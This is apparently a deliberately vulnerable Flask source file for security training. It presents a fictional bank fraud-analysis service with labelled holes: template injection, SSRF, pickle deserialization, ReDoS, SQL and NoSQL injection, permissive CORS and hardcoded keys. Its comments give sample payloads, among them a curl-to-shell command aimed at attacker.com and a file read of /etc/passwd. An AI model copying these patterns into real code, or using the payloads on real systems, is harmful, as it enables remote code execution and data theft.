"""
VaultBank Fraud Analysis Service
Additional fraud detection endpoints — ML-based scoring, rule engine, reporting

SECURITY TRAINING PROJECT - DELIBERATELY VULNERABLE
This file contains intentional security vulnerabilities (VULN-880 through VULN-889)
for use in security training exercises. DO NOT USE IN PRODUCTION.
"""

import base64
import pickle
import re
import sqlite3
import requests

from flask import Flask, request, jsonify, Blueprint
from jinja2 import Template, Environment
from pymongo import MongoClient

analyze_bp = Blueprint("analyze", __name__)

# ─── VULN-886: Hardcoded ML model API key ────────────────────────────────────
MODEL_API_KEY   = "FakeMLApiKey_VaultBank_2024_abcdef"   # VULN-886
MODEL_ENDPOINT  = "https://ml.vaultbank.internal/fraud/v2"
MONGO_URI       = "mongodb://vaultbank:FakeMongoPwd2024@mongo.vaultbank.internal:27017/fraud"

mongo_client = MongoClient(MONGO_URI)
db           = mongo_client["fraud"]

# ─── SQLite for local transaction cache (also in Postgres for real data) ──────
sqlite_conn = sqlite3.connect(":memory:", check_same_thread=False)
sqlite_conn.execute(
    "CREATE TABLE IF NOT EXISTS transactions "
    "(id TEXT, merchant TEXT, amount REAL, customer_id TEXT)"
)


# ─── VULN-880: SSTI — user-controlled template rendered by Jinja2 ─────────────
@analyze_bp.route("/fraud/report", methods=["GET"])
def fraud_report():
    """
    Generate a fraud report using a template.
    VULN-880: template string comes from request args — arbitrary code execution via:
      {{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
    """
    template_str = request.args.get("template", "Risk score: {{ data.score }}")
    fraud_data = {
        "score": 0.87,
        "reasons": ["velocity", "geo_anomaly"],
        "transaction_id": request.args.get("tx_id", "TX-UNKNOWN"),
    }
    # VULN-880: Template() created directly from user input — no sandboxing
    rendered = Template(template_str).render(data=fraud_data)  # VULN-880
    return rendered, 200, {"Content-Type": "text/html"}


# ─── VULN-881: Jinja2 sandbox escape — template from DB rendered without SandboxedEnvironment ─
@analyze_bp.route("/fraud/db-report", methods=["POST"])
def fraud_db_report():
    """
    Render a fraud report template stored in the database.
    VULN-881: templates are stored in MongoDB (editable by admins) and rendered
    with a standard Jinja2 Environment — no SandboxedEnvironment.
    """
    data = request.json or {}
    template_id = data.get("template_id")

    tmpl_doc = db["report_templates"].find_one({"_id": template_id})
    if not tmpl_doc:
        return jsonify({"error": "Template not found"}), 404

    # VULN-881: plain Environment, not SandboxedEnvironment
    env = Environment()  # VULN-881: should be SandboxedEnvironment from jinja2.sandbox
    template = env.from_string(tmpl_doc["body"])
    rendered = template.render(customer=data.get("customer", {}), tx=data.get("tx", {}))
    return rendered, 200, {"Content-Type": "text/html"}


# ─── VULN-882: SSRF in external fraud score API call ─────────────────────────
@analyze_bp.route("/fraud/external-score", methods=["POST"])
def external_fraud_score():
    """
    Call an external fraud scoring provider.
    VULN-882: provider hostname comes from the request body, which may originate
    from user-controlled config — allows SSRF to internal services.
    """
    data = request.json or {}
    tx_id    = data.get("tx_id", "")
    provider = data.get("provider", "fraud-api.vaultbank.internal")  # VULN-882: from client

    # VULN-882: arbitrary outbound HTTP request to user-controlled host
    url = f"http://{provider}/score/{tx_id}"  # VULN-882
    try:
        resp = requests.get(url, headers={"X-API-Key": MODEL_API_KEY}, timeout=5)
        return jsonify(resp.json()), resp.status_code
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ─── VULN-883: Pickle deserialization of ML model input ──────────────────────
@analyze_bp.route("/fraud/custom-model", methods=["POST"])
def custom_model_predict():
    """
    Allow clients to supply a serialized model for custom fraud scoring.
    VULN-883: pickle.loads on user-supplied base64 data — arbitrary code execution.
    e.g. base64(pickle.dumps(os.system('curl http://attacker.com/shell.sh | sh')))
    """
    data = request.json or {}
    encoded = data.get("model_data", "")

    # VULN-883: deserializing user-supplied pickle data
    model = pickle.loads(base64.b64decode(encoded))  # VULN-883

    features = data.get("features", {})
    score = model.predict([list(features.values())])
    return jsonify({"fraud_score": float(score[0])}), 200


# ─── VULN-884: ReDoS in transaction pattern matcher ─────────────────────────
# Catastrophic backtracking on description strings like 'AAAA...AAAA!'
TRANSACTION_PATTERN = re.compile(
    r"^(MERCHANT|VENDOR|POS|ATM|ACH|WIRE)[\s\-_]+([\w\s]+[\s\-_])*[\w]+$"  # VULN-884
)


@analyze_bp.route("/fraud/match-pattern", methods=["GET"])
def match_pattern():
    """
    VULN-884: ReDoS — catastrophic backtracking regex applied to user input.
    Input like 'MERCHANT AAAAAAAAAAAAAAAAAAAAAA!' hangs the event loop.
    """
    description = request.args.get("description", "")
    is_match = bool(TRANSACTION_PATTERN.match(description))  # VULN-884
    return jsonify({"matched": is_match, "description": description}), 200


# ─── VULN-885: SQL injection in fraud query ──────────────────────────────────
@analyze_bp.route("/fraud/transactions", methods=["GET"])
def get_fraud_transactions():
    """
    VULN-885: merchant name interpolated directly into SQL query string.
    e.g. merchant = "'; DROP TABLE transactions; --"
    """
    merchant = request.args.get("merchant", "")
    customer = request.args.get("customer_id", "")

    # VULN-885: f-string SQL injection
    query = f"SELECT * FROM transactions WHERE merchant='{merchant}' AND customer_id='{customer}'"  # VULN-885
    cursor = sqlite_conn.execute(query)
    rows = [dict(zip([c[0] for c in cursor.description], row)) for row in cursor.fetchall()]
    return jsonify(rows), 200


# ─── VULN-887: Debug endpoint exposing model weights ─────────────────────────
@analyze_bp.route("/debug/model-weights", methods=["GET"])
def debug_model_weights():
    """
    VULN-887: no authentication — returns the full fraud detection model weights.
    An adversary can use this to craft transactions that score as legitimate.
    """
    # VULN-887: full model internals returned to any caller
    try:
        resp = requests.get(
            f"{MODEL_ENDPOINT}/weights",
            headers={"X-API-Key": MODEL_API_KEY},  # VULN-886: hardcoded key used
            timeout=10,
        )
        return jsonify(resp.json()), 200
    except Exception as e:
        # Return a static fake payload if the model service is down
        return jsonify({
            "model_version": "fraud_xgb_v3.1",
            "feature_importances": {
                "amount": 0.34,
                "velocity_1h": 0.28,
                "geo_distance": 0.19,
                "merchant_category": 0.11,
                "time_of_day": 0.08,
            },
            "threshold": 0.72,
            "note": "VULN-887: model weights returned without auth",
        }), 200


# ─── VULN-888: CORS — reflects arbitrary Origin header ───────────────────────
@analyze_bp.after_request
def add_cors_headers(response):
    """
    VULN-888: Access-Control-Allow-Origin reflects whatever Origin header was sent.
    Combined with Access-Control-Allow-Credentials: true, this allows any origin
    to make credentialed requests — complete CORS bypass.
    """
    # VULN-888: origin reflected without validation
    origin = request.headers.get("Origin", "*")
    response.headers["Access-Control-Allow-Origin"] = origin   # VULN-888
    response.headers["Access-Control-Allow-Credentials"] = "true"
    response.headers["Access-Control-Allow-Methods"] = "GET, POST, PUT, DELETE, OPTIONS"
    response.headers["Access-Control-Allow-Headers"] = "Content-Type, Authorization"
    return response


# ─── VULN-889: NoSQL injection in MongoDB fraud log query ─────────────────────
@analyze_bp.route("/fraud/events", methods=["GET"])
def get_fraud_events():
    """
    VULN-889: tx_id from query params merged into the MongoDB find() filter dict.
    An attacker can inject MongoDB operators:
      GET /fraud/events?tx_id[$ne]=null → returns all fraud events
      GET /fraud/events?tx_id[$regex]=.* → regex matches all
    """
    tx_id = request.args.get("tx_id", "")

    # VULN-889: to_dict() returns a MultiDict as a flat dict — includes all params
    # e.g. ?tx_id[$gt]=&score[$gt]=0 injects into the Mongo filter
    extra_filters = request.args.to_dict()  # VULN-889: user-controlled dict merged into query

    # VULN-889: spread of user args into MongoDB find() filter
    events = list(db["fraud_events"].find(
        {"tx_id": tx_id, **extra_filters},  # VULN-889: operator injection possible
        {"_id": 0}
    ))
    return jsonify(events), 200


# ─── Flask app factory ───────────────────────────────────────────────────────
def create_app():
    app = Flask(__name__)
    app.register_blueprint(analyze_bp)
    return app


if __name__ == "__main__":
    app = create_app()
    # VULN-887: debug=True also exposes the Werkzeug debugger PIN
    app.run(host="0.0.0.0", port=5001, debug=True)
